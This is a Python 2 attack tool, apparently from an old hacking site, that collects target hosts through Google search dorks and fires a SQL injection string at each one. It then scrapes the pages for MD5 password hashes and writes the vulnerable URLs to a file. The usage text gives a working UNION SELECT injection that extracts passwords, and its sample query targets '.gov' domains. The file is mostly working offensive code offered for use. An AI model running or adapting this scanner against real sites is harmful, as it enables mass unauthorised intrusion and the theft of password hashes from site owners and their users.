#!/usr/bin/python
#SQL Scanner that will collect hosts using a google query. Will add the
#injection code to each host and search for md5 in the source.

#http://darkcode.ath.cx
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, sets, time, socket, httplib

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com SQL Scanner v1.0"
	print "\t-----------------------------------------------"
	
def usage():
	title()
	print "\n  Usage: python SQLscan.py <options>\n"
	print "\n  Example: python SQLscan.py -g inurl:'.gov' 200 -s '/index.php?offset=-1/**/UNION/**/SELECT/**/1,2,concat(password)/**/FROM/**/TABLE/*' -write sql_found.txt -v\n"
	print "\t[options]"
	print "\t   -g/-google <query> <num of hosts> : Searches google for hosts"
	print "\t   -s/-sql <file+injection code> : Vuln. file plux sql injection"	
	print "\t   -w/-write <file> : Writes potential SQL found to file"
	print "\t   -v/-verbose : Verbose Mode\n"

def StripTags(text):
     finished = 0
     while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]
                 finished = 0
     return text
	
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def geturls(query):
	
	counter =  10
	urls = []
	while counter < int(num):
		url = 'http://www.google.com/search?hl=en&q='+query+'&hl=en&lr=&start='+repr(counter)+'&sa=N'
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
		data = opener.open(url).read()
		hosts = re.findall(('\w+\.[\w\.\-/]*\.\w+'),StripTags(data))
		#Lets add sites found to a list if not already or a google site.
		#We don't want to upset the people that got our list for us.
		for x in hosts:
			if x.find('www') != -1:
				x = x[x.find('www'):]
			if x not in urls and re.search("google", x) == None:
				urls.append(x)
		counter += 10
	return urls
			
def tester(victim):
	
	if victim[:7] != "http://":
		victim = "http://"+victim.rsplit("/",1)[0]+sql
	if verbose ==1:
		print "Testing:",victim
	try:
		source = urllib2.urlopen(victim.rsplit("/",1)[0]+sql, "80").read()
		md5s = re.findall("[a-f0-9]"*32,source)
		if len(md5s) >= 1:
			md5s = list(sets.Set(md5s))
			print "\n[!] MD5 Found:",''.join([str(i) for i in victim.split("/",3)[:3]])[5:]
			for md5 in md5s:
				print "\t[",md5,"]\n"
			found_sql.append(victim)
	except(socket.timeout, socket.gaierror, socket.error, IOError, ValueError, httplib.BadStatusLine):
		pass
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
	except():
		pass
	
if len(sys.argv) < 6:
	usage()
	sys.exit(1)
 
for arg in sys.argv[1:]:
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
	if arg.lower() == "-w" or arg.lower() == "-write":
		txt = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-s" or arg.lower() == "-sql":
		sql = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-g" or arg.lower() == "-google":
		query = sys.argv[int(sys.argv[1:].index(arg))+2]
		num = sys.argv[int(sys.argv[1:].index(arg))+3]
title()
socket.setdefaulttimeout(10)
found_sql = []
count = 0
print "\n[+] SQL_scan Loaded"
try:
	if verbose ==1:
		print "[+] Verbose Mode On"
except(NameError):
	verbose = 0
	print "[-] Verbose Mode Off"
if sql[:1] != "/":
	sql = "/"+sql
print "[+] SQL:",sql
try:
	if txt:
		print "[+] File:",txt
except(NameError):
	txt = None
	pass
try:
	if num.isdigit() == False:
		print "\n[-] Argument [",num,"] must be a number.\n"
		sys.exit(1)
	else:
		if int(num) <= 10:
			print "\n[-] Argument [",num,"] must be greater than 10.\n"
			sys.exit(1)
except(IndexError):
	print "\n[-] Need number of hosts to collect.\n"
	sys.exit(1)
query = re.sub("\s","+",query)
print "[+] Query:",query
print "[+] Number:",num
print "[+] Querying Google..."
urls = geturls(query)
print "[+] Collected:",len(urls),"hosts"
print "[+] Started:",timer()
print "[+] Scanning hosts..."
print "\n[-] Cancel: Press Ctrl-C"
for url in urls:
	tester(url)
time.sleep(3)
print "-"*65
print "\n\n[+] Potential SQL found:",len(found_sql),"\n"
time.sleep(3)
if txt != None and len(found_sql) >=1:
	sql_file = open(txt, "a")
	sql_file.writelines("\n\td3hydr8[at]gmail[dot]com SQL Scanner v1.0\n")
	sql_file.writelines("\t------------------------------------------\n\n")
	print "[+] Writing Data:",txt
else:
	print "[-] No data written to disk"
for k in found_sql:
	count+=1
	if txt != None:
		sql_file.writelines("["+str(count)+"] "+k+"\n")
		print "\n["+str(count)+"]",k
print "\n[-] Done -",timer(),"\n"

